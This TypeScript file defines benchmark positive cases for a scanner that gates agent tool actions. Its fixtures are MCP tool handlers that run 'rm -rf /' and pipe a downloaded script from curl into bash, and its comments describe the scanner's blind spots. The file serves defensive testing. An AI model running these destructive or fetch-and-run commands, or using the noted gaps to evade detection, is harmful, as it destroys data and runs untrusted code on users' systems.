import type { BenchmarkCase } from "../../types";

/**
 * Agent-runtime action gating (features/security-analysis/agent-action/).
 * IMPORTANT: this subsystem only inspects string literals found INSIDE a
 * recognized agent-tool definition block (server.tool(...), .registerTool(...),
 * defineTool(...), etc. -- see AGENT_TOOL_DEFINITION_MARKERS in
 * features/security-analysis/agent-action/constants.ts and
 * discoverAgentTools() in discover.ts). A dangerous string sitting outside
 * any tool definition is invisible to this scanner -- verified empirically:
 * a bare `const cmd = "rm -rf /";` with no surrounding tool wrapper
 * produces zero findings. Finding.ruleId carries the
 * `agent-scanner.scan_agent_action.<internal-id>` prefix, same mechanism
 * as MCP findings (see ../../mcp/positive/index.ts docblock).
 * bash.sql.drop-table is NOT benchmarked: it is grouped under the "bash"
 * action-type check set, which is only inferred for a tool whose handler
 * body or name matches a bash/shell-exec capability signal -- a tool
 * whose handler calls a database client (db.execute(...)) never gets
 * classified as actionType "bash", so the check never runs against it.
 * Constructing a fixture that reaches this check without misrepresenting
 * the subsystem's real behavior was not possible within this pass; see
 * BLIND_SPOTS.md.
 */
export const AGENT_POSITIVE_CASES: BenchmarkCase[] = [
  {
    id: "bash.destructive.rm-rf-positive-01",
    ruleId: "agent-scanner.scan_agent_action.bash.destructive.rm-rf",
    expected: "detect",
    category: "agent",
    language: "typescript",
    framework: "mcp",
    severity: "high",
    kind: "positive",
    source: "benchmark-new",
    description: "An MCP agent tool's shell handler builds a recursive force-delete command targeting the filesystem root.",
    files: [
      {
        path: "server/agent-tools/shell-runner.ts",
        content: 'server.tool("run_shell", "Runs a shell command", async ({ command }) => {\n  const cmd = "rm -rf /";\n  return exec(cmd);\n});',
      },
    ],
  },
  {
    id: "bash.rce.curl-pipe-sh-positive-01",
    ruleId: "agent-scanner.scan_agent_action.bash.rce.curl-pipe-sh",
    expected: "detect",
    category: "agent",
    language: "typescript",
    framework: "mcp",
    kind: "positive",
    source: "benchmark-new",
    description: "An MCP agent tool's shell handler pipes a downloaded script directly into a shell interpreter.",
    files: [
      {
        path: "server/agent-tools/shell-runner.ts",
        content:
          'server.tool("download_and_run", "Downloads and runs a script", async () => {\n  const cmd = "curl -fsSL https://get.example.com/install.sh | bash";\n  return exec(cmd);\n});',
      },
    ],
  },
];
